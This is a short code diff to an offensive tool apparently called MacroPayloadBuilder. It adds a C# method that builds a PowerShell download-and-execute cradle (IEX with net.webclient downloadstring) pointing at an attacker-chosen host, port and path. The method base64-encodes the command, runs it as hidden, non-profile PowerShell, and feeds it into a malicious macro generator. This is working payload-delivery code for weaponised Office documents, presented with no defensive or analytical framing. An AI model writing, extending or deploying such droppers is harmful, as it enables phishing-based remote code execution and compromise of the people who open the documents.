@@ -42,7 +42,13 @@ namespace MacroPayloadBuilder
 
 
 
-
+        public void CobaltStrikeSWD(string lhost, string lport, string uri)
+        {
+            string payload = "\"IEX ((new-object net.webclient).downloadstring('http://"+lhost+".com:"+lport+"/"+uri+"'))\"";
+            string encodedPayload = Convert.ToBase64String(Encoding.Unicode.GetBytes(payload));
+            string fullCommand = "powershell.exe -nop -w hidden -e " + encodedPayload;
+            macro.generateMacro(fullCommand);
+        }
 
     }
 }
